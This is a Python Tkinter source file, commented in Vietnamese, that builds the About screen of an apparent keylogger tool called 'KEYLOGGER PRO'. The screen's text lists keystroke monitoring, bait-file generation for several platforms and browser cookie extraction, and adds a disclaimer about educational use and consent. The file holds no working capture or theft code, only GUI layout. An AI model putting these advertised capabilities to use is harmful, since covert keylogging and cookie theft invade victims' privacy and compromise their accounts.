#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Module chứa AboutFrame - Giao diện giới thiệu ứng dụng
"""

import logging
import tkinter as tk
from tkinter import ttk, scrolledtext
from typing import Optional, Callable

from gui.resources import UIResources

logger = logging.getLogger("keylogger.gui.about_frame")

class AboutFrame:
    """Frame giao diện cho chức năng giới thiệu ứng dụng."""
    
    def __init__(self, parent, callback: Optional[Callable] = None):
        """Khởi tạo frame giới thiệu.
        
        Args:
            parent: Widget cha để chứa frame này
            callback: Hàm callback khi trạng thái thay đổi (tùy chọn)
        """
        self.parent = parent
        self.callback = callback
        
        # Tạo giao diện
        self.create_widgets()
    
    def create_widgets(self):
        """Tạo các thành phần giao diện người dùng."""
        # Frame chính
        self.frame = ttk.Frame(self.parent)
        self.frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        self.frame.grid_columnconfigure(0, weight=1)
        self.frame.grid_rowconfigure(1, weight=1)
        
        # Tiêu đề
        title_frame = ttk.Frame(self.frame)
        title_frame.grid(row=0, column=0, sticky="ew", pady=(0, 10))
        
        title_label = ttk.Label(
            title_frame, text="GIỚI THIỆU VỀ ỨNG DỤNG", font=("Arial", 16, "bold")
        )
        title_label.pack(pady=10)
        
        # Frame nội dung
        content_frame = ttk.Frame(self.frame)
        content_frame.grid(row=1, column=0, sticky="nsew", padx=10, pady=5)
        content_frame.grid_columnconfigure(0, weight=1)
        content_frame.grid_rowconfigure(1, weight=1)
        
        # Logo ứng dụng (tạo hình đơn giản)
        logo_frame = ttk.Frame(content_frame)
        logo_frame.grid(row=0, column=0, pady=10)
        
        try:
            # Tạo logo từ text
            logo_label = ttk.Label(
                logo_frame,
                text="KL",
                font=("Arial", 40, "bold"),
                foreground="#0078d7",
                background="#e0f0ff",
                width=4,
                anchor=tk.CENTER,
            )
            logo_label.pack(pady=10)
            
            # Tên ứng dụng
            app_name = ttk.Label(
                logo_frame, text="KEYLOGGER PRO", font=("Arial", 16, "bold")
            )
            app_name.pack()
            
            # Phiên bản
            version = ttk.Label(logo_frame, text="Phiên bản 1.0.0")
            version.pack()
        except Exception as e:
            logger.error(f"Lỗi khi tạo logo: {e}")
        
        # Thông tin ứng dụng
        info_frame = ttk.LabelFrame(content_frame, text="Thông tin")
        info_frame.grid(row=1, column=0, sticky="nsew", pady=10)
        info_frame.grid_columnconfigure(0, weight=1)
        info_frame.grid_rowconfigure(0, weight=1)
        
        about_text = scrolledtext.ScrolledText(info_frame, wrap=tk.WORD)
        about_text.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        
        # Thêm nội dung
        about_text.insert(tk.END, "KEYLOGGER PRO - CÔNG CỤ THEO DÕI BÀN PHÍM\n\n", "title")
        
        about_text.insert(
            tk.END,
            "Ứng dụng này được phát triển với mục đích giáo dục, nghiên cứu và học tập. "
            + "Nó cho phép theo dõi hoạt động bàn phím trên hệ thống máy tính một cách hiệu quả, "
            + "với khả năng lưu trữ và quản lý dữ liệu an toàn.\n\n",
        )
        
        about_text.insert(tk.END, "TÍNH NĂNG CHÍNH:\n", "subtitle")
        about_text.insert(tk.END, "• Theo dõi keystrokes với hiệu suất cao\n")
        about_text.insert(tk.END, "• Quản lý nhiều thiết bị trong một giao diện\n")
        about_text.insert(tk.END, "• Xuất dữ liệu ra nhiều định dạng\n")
        about_text.insert(tk.END, "• Mã hóa dữ liệu bảo mật\n")
        about_text.insert(tk.END, "• Tạo file mồi cho nhiều nền tảng\n")
        about_text.insert(tk.END, "• Trích xuất cookie từ trình duyệt\n")
        about_text.insert(tk.END, "• Giao diện người dùng hiện đại\n\n")
        
        about_text.insert(tk.END, "CHÚ Ý QUAN TRỌNG:\n", "warning")
        about_text.insert(
            tk.END,
            "Ứng dụng này chỉ nên được sử dụng trên các thiết bị mà bạn có quyền sở hữu "
            + "hoặc được phép sử dụng rõ ràng. Việc sử dụng ứng dụng này để theo dõi người khác "
            + "mà không có sự đồng ý là vi phạm quyền riêng tư và có thể vi phạm pháp luật "
            + "tại nhiều quốc gia.\n\n",
        )
        
        about_text.insert(tk.END, "Phát triển bởi: Team Developer\n")
        about_text.insert(tk.END, "Email: contact@example.com\n")
        about_text.insert(tk.END, "© 2023 All Rights Reserved\n")
        
        # Định dạng các thẻ văn bản
        about_text.tag_configure("title", font=("Arial", 12, "bold"), justify="center")
        about_text.tag_configure("subtitle", font=("Arial", 10, "bold"))
        about_text.tag_configure(
            "warning", font=("Arial", 10, "bold"), foreground="red"
        )
        
        # Không cho phép chỉnh sửa
        about_text.config(state=tk.DISABLED)
    
    def get_frame(self):
        """Trả về frame chính để thêm vào container."""
        return self.frame